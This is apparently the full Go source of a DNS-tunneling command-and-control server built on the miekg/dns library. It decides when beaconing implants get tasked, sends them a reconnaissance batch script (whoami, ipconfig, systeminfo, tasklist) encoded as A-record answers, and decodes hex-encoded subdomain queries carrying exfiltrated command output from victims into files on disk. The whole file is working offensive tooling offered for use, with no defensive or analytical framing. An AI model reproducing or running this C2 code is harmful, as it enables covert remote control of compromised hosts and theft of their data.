package main

import (
	"fmt"
	"io"
	"log"
	"regexp"
	"strconv"
	"flag"
	"encoding/hex"
	// "strings"
	"os"
	"net"
	"math/rand"
	"io/ioutil"

	"github.com/miekg/dns"
)

const port = 53

func createRR(request, ip string) *dns.A {
	return &dns.A{
		Hdr: dns.RR_Header{ Name: request, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60 },
		A: net.ParseIP(ip),
	}
}

func handleDnsRequest(w dns.ResponseWriter, r *dns.Msg) {
	msg := dns.Msg{}
	name := r.Question[0].Name
	recType := r.Question[0].Qtype

	msg.SetReply(r)

	log.Printf("%s request for %s\n", dns.TypeToString[recType], name)

	switch recType {
	case dns.TypeA:
		// regex to parse for subdomain indicating upload of data to target
		re := regexp.MustCompile(`\d+ID(?P<uid>\S{4})(?P<seq>\d+)-0-2D-2D\..*`)
		if re.Match([]byte(name)) {
			upload := re.FindAllStringSubmatch(name,-1)[0]
			uid := upload[1]
			seq, _ := strconv.Atoi(upload[2])

			switch seq {
			// if sequence == 0, normal beacon
			case 0:
				// 0.7 - modify frequency that scripts get sent to implant
				if rand.Float64() > 0.7 {
					log.Printf("Sending script to execute to uid %s", uid)
					rr, _ := dns.NewRR(fmt.Sprintf("%s A %s", r.Question[0].Name, "36.37.94.33"))
					msg.Answer = append(msg.Answer, rr)
				} else {
					log.Printf("Letting uid %s to continue beaconing", uid)
					rr, _ := dns.NewRR(fmt.Sprintf("%s A %s", r.Question[0].Name, "0.0.0.0"))
					msg.Answer = append(msg.Answer, rr)
				}
				break
			// in the middle of sending data
			default:
				var result []int
				
				data, _ := ioutil.ReadFile("payload.bat")
				for i := 0; i < len(data); i++ {
					result = append(result, int(data[i]))
				}

				//Pad data to 4
				for i := 0 ; i < len(result) % 4; i++ {
					result = append(result, 0)
				}

				totalseq := ( len(result) / 4 ) + 1
	 			// not finished sending yet
				if seq != totalseq {
					log.Printf("Sending data %d of %d to %s", seq, totalseq, uid)
					seq = seq - 1 // sequence starts from 1
					data := fmt.Sprintf("%d.%d.%d.%d", result[seq*4], result[seq*4+1], result[seq*4+2], result[seq*4+3])
					rr, _ := dns.NewRR(fmt.Sprintf("%s A %s", r.Question[0].Name, data))
					msg.Answer = append(msg.Answer, rr)
				} else {
					log.Printf("Finished uploading script to %s", uid)
					rr, _ := dns.NewRR(fmt.Sprintf("%s A %s", r.Question[0].Name, "33.33.94.94"))
					msg.Answer = append(msg.Answer, rr)
				}
			}

			w.WriteMsg(&msg)
			return
		}
		

		// regex to parse for subdomain indicating download of data from target
		re2 := regexp.MustCompile(`\d+ID(?P<uid>\S{4})(?P<seq>\d+)-(?P<totalseq>\d+)-(?P<data>\S+)-(?P<filename>\S+)\..*`)
		if re2.Match([]byte(name)) {
			download := re2.FindAllStringSubmatch(name,-1)[0]
			uid := download[1]
			seq := download[2]
			totalseq := download[3]
			data, _ := hex.DecodeString(download[4])
			filename, _ := hex.DecodeString(download[5])

			if seq == totalseq {
				log.Printf("Received full command output from %s", uid)
			}
			//output received data to file, data in hex
			log.Printf("Receiving data %s of %s from %s", seq, totalseq, uid)

			output := uid + "-" + string(filename) + ".txt"
			f, _ := os.OpenFile(output, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0755)
			f.Write(data)
			f.Close()

			rr, _ := dns.NewRR(fmt.Sprintf("%s A %s", r.Question[0].Name, "0.0.0.0"))
			msg.Answer = append(msg.Answer, rr)
		}

		w.WriteMsg(&msg)	
	case dns.TypeAAAA:
		rr, _ := dns.NewRR(fmt.Sprintf("%s AAAA %s", r.Question[0].Name, "ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff"))
		msg.Answer = append(msg.Answer, rr)
		w.WriteMsg(&msg)	
	}
}

func main() {
	var (
        port = flag.Int("port", 53, "Port to listen for DNS connections")
    )

    flag.Parse()

	file, _ := os.OpenFile("run.log", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
    defer file.Close()
    mw := io.MultiWriter(os.Stdout, file)
	log.SetOutput(mw)

	// attach request handler func
	dns.HandleFunc(".", handleDnsRequest)

	// generate payload file
	f, _ := os.OpenFile("payload.bat", os.O_CREATE|os.O_WRONLY, 0755)
	d := []string{"ECHO OFF\r", "whoami\r", "hostname\r", "ipconfig\r", "systeminfo\r", "tasklist\r"}
	for _, v := range d {
        fmt.Fprintln(f, v)
    }
	f.Close()

	// start server
	log.Printf("Starting at Port %d\n", *port)

	server := &dns.Server{Addr: ":" + strconv.Itoa(*port), Net: "udp"}
	err := server.ListenAndServe()
	defer server.Shutdown()
	if err != nil {
		log.Fatalf("Failed to start server: %s\n ", err.Error())
	}
}